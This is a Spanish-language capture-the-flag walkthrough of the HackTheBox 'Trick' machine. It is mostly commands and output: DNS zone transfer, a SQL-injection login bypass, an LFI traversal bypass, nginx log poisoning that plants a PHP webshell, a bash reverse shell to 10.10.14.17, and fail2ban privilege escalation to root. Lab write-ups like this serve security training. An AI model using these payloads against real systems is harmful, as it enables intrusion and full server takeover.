PORT   STATE SERVICE
22/tcp open  ssh
25/tcp open  smtp
53/tcp open  domain
80/tcp open  http

-Entramos al puerto 80 pero no vemos nada interesante

-Hacemos lo siguiente para enumerar el dominio de la máquina según la IP:
	-nslookup
		server 10.10.11.166
		10.10.11.166
		166.11.10.10.in-addr.arpa	name = **trick.htb.**

-Añadimos trick.htb al /etc/hosts

-Ahora que tenemos el dominio, y sabiendo que el puerto 53 está abierto, vamos a hacer un **Ataque de Transferencia de Zona (AXFR)**:
	-dig AXFR trick.htb @10.10.11.166
		**preprod-payroll.trick.htb (Subdominio Descubierto!!)**

-Visitamos el nuevo subdominio desde la URL y nos redirige a la ruta /login.php:
	-http://preprod-payroll.trick.htb/login.php

-Nos saltamos el Panel de Login fácilmente con un SQL Injection sencillo:
	-Username: 'or true-- -
	-Password: 'or true-- -

-Nos encontramos la siguiente URL:
	-http://preprod-payroll.trick.htb/index.php?page=home

-En un principio, podemos pensar que se trata de un Local File Inclusion (LFI), sin embargo, por más que he intentado cosas no he podido leer el /etc/passwd

-Hay que hacer Fuzzing de subdominios de la siguiente forma:
	-wfuzz -c --hh=5480 -t 200 -w /usr/share/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -H "HOST: preprod-FUZZ.trick.htb" http://trick.htb
		marketing (Nuevo Subdominio Encontrado!!)

-Nos encontramos con una web diferente y otro posible LFI:
	-http://preprod-marketing.trick.htb/index.php?page=services.html

-Probamos a listar el /etc/passwd con el siguiente Bypass:
	-http://preprod-marketing.trick.htb/index.php?page=....//....//....//etc/passwd
		-Vemos el /etc/passwd!!!

-Como el servidor es un Nginx, probamos a listar los logs:
	-http://preprod-marketing.trick.htb/index.php?page=....//....//....//var/log/nginx/access.log
		-Vemos los logs!!

-Ejecutamos un comando:
	-curl -s -X GET 'http://preprod-marketing.trick.htb/index.php?page=....//....//....//var/log/nginx/access.log' -H "User-Agent: <?php system('id'); ?>"
		uid=1001(michael) gid=1001(michael) groups=1001(michael),1002(security)

-Subimos una webshell y obtenemos acceso a la máquina:
	-Subimos una webshell:
		-curl -s -X GET 'http://preprod-marketing.trick.htb/index.php?page=....//....//....//var/log/nginx/access.log' -H "User-Agent: <?php system(\$_GET['cmd']); ?>"
	-Obtenemos acceso:
		-http://preprod-marketing.trick.htb/index.php?page=....//....//....//var/log/nginx/access.log&cmd=bash%20-c%20%27bash%20-i%20%3E%26%20/dev/tcp/10.10.14.17/1234%200%3E%261%27
			michael@trick:/$ 

## Escalada de Privilegios

-Vemos los permisos sudoers:
	-sudo -l:
		(root) NOPASSWD: /etc/init.d/fail2ban restart

-Explotamos el servicio fail2ban, siguiente los pasos de este recurso:
	https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/sudo/sudo-fail2ban-privilege-escalation/
	(Utilicamos el 'Method 2' en el 1 paso)

root@trick:/# whoami
root



